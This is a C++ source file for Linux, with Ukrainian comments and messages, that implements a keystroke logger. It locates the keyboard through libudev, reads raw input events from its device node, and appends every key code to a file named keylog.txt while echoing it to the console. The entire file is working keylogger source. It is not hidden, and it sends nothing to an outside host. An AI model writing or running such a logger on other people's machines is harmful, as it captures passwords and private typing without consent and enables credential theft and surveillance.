#include <iostream>
#include <fstream>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
#include <libudev.h>
#include <string>
#include <cstring>

// === Константи ===
const std::string LOG_FILE = "keylog.txt";
const std::string TARGET_KEYWORD = "Keyboard";

// === Функція для пошуку клавіатурного пристрою ===
std::string find_keyboard_device() {
    struct udev* udev = udev_new();
    if (!udev) {
        std::cerr << "Помилка ініціалізації udev.\n";
        return "";
    }

    struct udev_enumerate* enumerate = udev_enumerate_new(udev);
    udev_enumerate_add_match_subsystem(enumerate, "input");
    udev_enumerate_scan_devices(enumerate);
    struct udev_list_entry* devices = udev_enumerate_get_list_entry(enumerate);

    std::string keyboardPath;

    for (struct udev_list_entry* entry = devices; entry != nullptr;
         entry = udev_list_entry_get_next(entry)) {

        const char* path = udev_list_entry_get_name(entry);
        struct udev_device* dev = udev_device_new_from_syspath(udev, path);

        const char* devnode = udev_device_get_devnode(dev);
        const char* name = udev_device_get_sysattr_value(dev, "name");

        if (devnode && name && strstr(name, TARGET_KEYWORD.c_str())) {
            keyboardPath = devnode;
            udev_device_unref(dev);
            break;
        }

        udev_device_unref(dev);
    }

    udev_enumerate_unref(enumerate);
    udev_unref(udev);
    return keyboardPath;
}

int main() {
    std::string device = find_keyboard_device();
    if (device.empty()) {
        std::cerr << "Клавіатура не знайдена.\n";
        return 1;
    }

    std::cout << "Знайдено клавіатуру: " << device << std::endl;

    int fd = open(device.c_str(), O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    std::ofstream logfile(LOG_FILE, std::ios::app);
    if (!logfile.is_open()) {
        std::cerr << "Не вдалося відкрити файл логів: " << LOG_FILE << std::endl;
        close(fd);
        return 1;
    }

    struct input_event ev;
    while (read(fd, &ev, sizeof(ev)) > 0) {
        if (ev.type == EV_KEY && ev.value == 1) {
            std::cout << "Натиснута клавіша (код): " << ev.code << std::endl;
            logfile << "Key code: " << ev.code << std::endl;
        }
    }

    logfile.close();
    close(fd);
    return 0;
}
